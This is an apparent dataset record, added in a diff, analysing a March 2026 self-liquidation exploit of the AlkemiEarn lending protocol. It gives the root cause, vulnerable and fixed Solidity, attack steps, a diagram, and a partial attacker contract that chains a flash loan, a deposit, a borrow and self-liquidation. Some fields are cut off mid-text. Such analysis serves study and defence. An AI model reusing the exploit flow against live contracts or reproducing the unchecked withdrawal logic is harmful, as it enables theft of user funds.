@@ -1,0 +1,42 @@
+{
+ "id": "2026__2026-03-10_AlkemiEarn_Self_Liquidation",
+ "source_file": "2026/2026-03-10_AlkemiEarn_Self_Liquidation.md",
+ "title": "AlkemiEarn — Self-Liquidation Business Logic Vulnerability Analysis",
+ "date": "2026-03-10",
+ "protocol": "AlkemiEarn",
+ "chain": "Ethereum",
+ "loss_raw": "43.45 ETH",
+ "loss_usd": null,
+ "root_cause": "Post-withdrawal health check absence in `withdraw()` combined with self-liquidation permitted in `liquidateBorrow()`, enabling abnormal withdrawal of 93.49 ETH",
+ "attack_tx": "0xa170...6d9d",
+ "vulnerable_contract": "0x4822...a888",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "function liquidateBorrow(\n    address borrower,\n    address borrowAsset,\n    address collateralAsset,\n    uint256 amountClose\n) external payable {\n    // ❌ No check for borrower == msg.sender\n    // ❌ Anyone can liquidate their own position\n    require(isUndercollateralized(borrower), \"not liquidatable\");\n\n    uint256 seizeAmount = calculateSeizeTokens(\n        borrowAsset, collateralAsset, amountClose\n    );\n\n    // Reduce debt\n    borrowBalances[borrower][borrowAsset] -= amountClose;\n\n    // Transfer collateral: borrower → msg.sender\n    // ❌ When borrower == msg.sender, collateral is deducted then re-credited\n    // ❌ Net profit equal to the liquidation bonus is generated\n    collateralBalances[borrower][collateralAsset] -= seizeAmount;\n    collateralBalances[msg.sender][collateralAsset] += seizeAmount;\n}",
+  "function withdraw(address token, uint256 amount) external {\n    uint256 balance = collateralBalances[msg.sender][token];\n    uint256 withdrawAmount = amount == type(uint256).max ? balance : amount;\n    require(withdrawAmount <= balance, \"insufficient balance\");\n\n    collateralBalances[msg.sender][token] -= withdrawAmount;\n\n    // ❌ No re-validation of collateral ratio after withdrawal\n    // ❌ Full withdrawal possible even with outstanding loans\n    payable(msg.sender).transfer(withdrawAmount);\n}",
+  "// Both supply() and borrow() accept aweth as an argument\nAlkemiEarn.supply{value: 50 ether}(aweth, 50 ether);   // Deposit as collateral\nAlkemiEarn.borrow(aweth, 39.5 ether);                    // Borrow the same asset\n\n// ❌ Same asset permitted as both collateral and debt simultaneously\n// ❌ Combined with self-liquidation, enables risk-free arbitrage"
+ ],
+ "code_after": [
+  "function liquidateBorrow(\n    address borrower,\n    address borrowAsset,\n    address collateralAsset,\n    uint256 amountClose\n) external payable {\n    // ✅ Prevent self-liquidation\n    require(borrower != msg.sender, \"cannot self-liquidate\");\n    require(isUndercollateralized(borrower), \"not liquidatable\");\n\n    uint256 seizeAmount = calculateSeizeTokens(\n        borrowAsset, collateralAsset, amountClose\n    );\n    borrowBalances[borrower][borrowAsset] -= amountClose;\n    collateralBalances[borrower][collateralAsset] -= seizeAmount;\n    collateralBalances[msg.sender][collateralAsset] += seizeAmount;\n}",
+  "function withdraw(address token, uint256 amount) external {\n    uint256 balance = collateralBalances[msg.sender][token];\n    uint256 withdrawAmount = amount == type(uint256).max ? balance : amount;\n    require(withdrawAmount <= balance, \"insufficient balance\");\n\n    collateralBalances[msg.sender][token] -= withdrawAmount;\n\n    // ✅ Post-withdrawal collateral ratio validation — health check if outstanding loans exist\n    require(\n        getAccountLiquidity(msg.sender) >= 0,\n        \"would cause undercollateralization\"\n    );\n\n    payable(msg.sender).transfer(withdrawAmount);\n}"
+ ],
+ "steps": [
+  "→ Disburse 51 WETH loan",
+  "→ Convert WETH to native ETH",
+  "→ Deposit 50 ETH as collateral",
+  "→ Borrow 39.5 ETH",
+  "→ Enter liquidatable LTV",
+  "→ Debt reduced + liquidation",
+  "→ Collateral balance abnormally",
+  "→ Full collateral withdrawal",
+  "→ Convert ETH → WETH",
+  "→ Repay 51 WETH to Balancer",
+  "→ EOA attacker"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────┐\n│  EOA Attacker (0x0ed1...cd7)        │\n└──────────────┬──────────────────────┘\n               │ calls attack()\n               ▼\n┌─────────────────────────────────────┐\n│  Attacker Contract (0xE408...94B)   │\n│  ① Request flashLoan(51 WETH)       │\n└──────────────┬──────────────────────┘\n               ▼\n┌─────────────────────────────────────┐\n│  Balancer Vault                     │\n│  → Disburse 51 WETH loan            │\n└──────────────┬──────────────────────┘\n               │ receiveFlashLoan() callback\n               ▼\n┌─────────────────────────────────────┐\n│  ② WETH.withdraw(51 ETH)           │\n│     → Convert WETH to native ETH    │\n│                                     │\n│  ③ supply{value: 50 ETH}(aweth)    │\n│     → Deposit 50 ETH as collater",
+  "function attack() external {\n    // ① Flash loan 51 WETH from Balancer Vault\n    address[] memory tokens = new address[](1);\n    tokens[0] = address(weth);\n    uint256[] memory amounts = new uint256[](1);\n    amounts[0] = 51 ether;\n    vault.flashLoan(address(this), tokens, amounts, \"\");\n}\n\nfunction receiveFlashLoan(\n    address[] memory tokens,\n    uint256[] memory amounts,\n    uint256[] memory feeAmounts,\n    bytes memory userData\n) external {\n    // ② Convert WETH → ETH\n    weth.withdraw(amounts[0]);\n\n    // ③ Deposit 50 ETH as collateral into AlkemiEarn\n    victimContract.supply{value: 50 ether}(aweth, 50 ether);\n\n    // ④ Borrow 39.5 ETH — deliberately enter liquidatable LTV\n    victimContract.borrow(aweth, 39.5 ether);\n\n    // ⑤ ★ Core: designate self as liquidation target\n    //    "
+ ]
+}
